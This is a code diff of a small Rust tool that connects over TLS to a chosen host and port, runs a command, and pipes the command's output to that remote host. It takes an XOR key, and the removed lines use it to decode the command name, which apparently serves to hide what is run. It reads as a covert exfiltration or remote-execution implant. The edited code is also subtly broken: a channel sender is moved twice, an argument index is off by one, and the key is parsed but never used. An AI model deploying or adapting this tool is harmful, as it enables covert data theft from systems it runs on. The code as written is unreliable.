@@ -1,4 +1,4 @@
-use std::io::{Read, Write, BufRead, BufReader};
+use std::io::{BufRead, BufReader, Write};
 use std::net::TcpStream;
 use std::process::{Command, Stdio};
 use std::sync::mpsc;
@@ -8,22 +8,15 @@ use native_tls::TlsConnector;
 fn main() {
     let args: Vec<String> = std::env::args().collect();
     if args.len() < 5 {
-        eprintln!("Usage: {} <host> <port> <envvar> <arguments> <xorkey>", args[0]);
+        eprintln!("Usage: {} <host> <port> <command> <arguments> <xorkey>", args[0]);
         std::process::exit(1);
     }
 
     let host = &args[1];
     let port = &args[2];
-    let envvar = &args[3];
+    let command = &args[3];
     let arguments = &args[4];
-    /*let xorkey: u8 = args[5].parse().expect("Invalid XOR key");
-	let envvar1: String = envvar.chars()
-        .map(|c| (c as u8 ^ xorkey) as char)
-        .collect();*/
-
-    //let envvar1: String = envvar.chars();
-
-    println!("Executing {} {} and redirecting stdout / stderr to {}:{}", envvar, arguments, host, port);
+    let xorkey: u8 = args[5].parse().expect("Invalid XOR key");
 
     let addr = format!("{}:{}", host, port);
     let stream = TcpStream::connect(&addr).expect("Failed to connect to the server");
@@ -34,9 +27,8 @@ fn main() {
     let mut stream = connector.connect(host, stream).unwrap();
 
     let (tx, rx) = mpsc::channel();
-    let tx2 = tx.clone();
-	
-    let mut child = Command::new(envvar)
+
+    let mut child = Command::new(command)
         .args(arguments.split_whitespace())
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
@@ -45,7 +37,7 @@ fn main() {
         .expect("Failed to execute command");
 
     let stdout = child.stdout.take().unwrap();
-    thread::spawn(move || {
+    let stdout_thread = thread::spawn(move || {
         let reader = BufReader::new(stdout);
         for line in reader.lines() {
             let line = line.unwrap();
@@ -54,17 +46,25 @@ fn main() {
     });
 
     let stderr = child.stderr.take().unwrap();
-    thread::spawn(move || {
+    let stderr_thread = thread::spawn(move || {
         let reader = BufReader::new(stderr);
         for line in reader.lines() {
             let line = line.unwrap();
-            tx2.send(line).unwrap();
+            tx.send(line).unwrap();
         }
     });
 
     loop {
-        let line = rx.recv().unwrap();
-        writeln!(stream, "{}", line).unwrap();
-        stream.flush().unwrap();
+        match rx.try_recv() {
+            Ok(line) => {
+                writeln!(stream, "{}", line).unwrap();
+                stream.flush().unwrap();
+            }
+            Err(mpsc::TryRecvError::Disconnected) => break,
+            Err(mpsc::TryRecvError::Empty) => {}
+        }
     }
+
+    stdout_thread.join().unwrap();
+    stderr_thread.join().unwrap();
 }
